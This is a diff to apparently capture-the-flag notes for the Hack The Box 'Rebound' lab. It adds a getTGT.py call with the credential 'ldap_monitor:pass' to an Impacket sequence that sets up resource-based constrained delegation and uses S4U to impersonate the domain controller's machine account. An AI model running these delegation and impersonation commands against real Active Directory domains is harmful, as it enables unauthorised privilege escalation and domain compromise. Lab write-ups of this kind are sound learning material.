@@ -59,6 +59,8 @@ export KRB5CCNAME=delegator\$@dc01.rebound.htb.ccache
 rbcd.py 'rebound.htb/delegator$' -delegate-from ldap_monitor -delegate-to 'delegator$' -action write -use-ldaps -dc-ip 10.10.11.231 -debug -k -no-pass
 
 # Uses a service principal’s TGT to get a Kerberos service ticket for an SPN as an impersonated account via S4U
+getTGT.py 'rebound.htb/ldap_monitor:pass' -dc-ip 10.10.11.231
+export KRB5CCNAME=ldap_monitor.ccache 
 getST.py -spn "browser/dc01.rebound.htb" -impersonate "dc01$" "rebound.htb/ldap_monitor" -k -no-pass -dc-ip 10.10.11.231
 
 # Use the service’s TGT plus the delegator’s proof (S4U2Proxy with an additional-ticket) to request an HTTP service ticket issued to the target machine account, save that machine-account ticket to a ccache
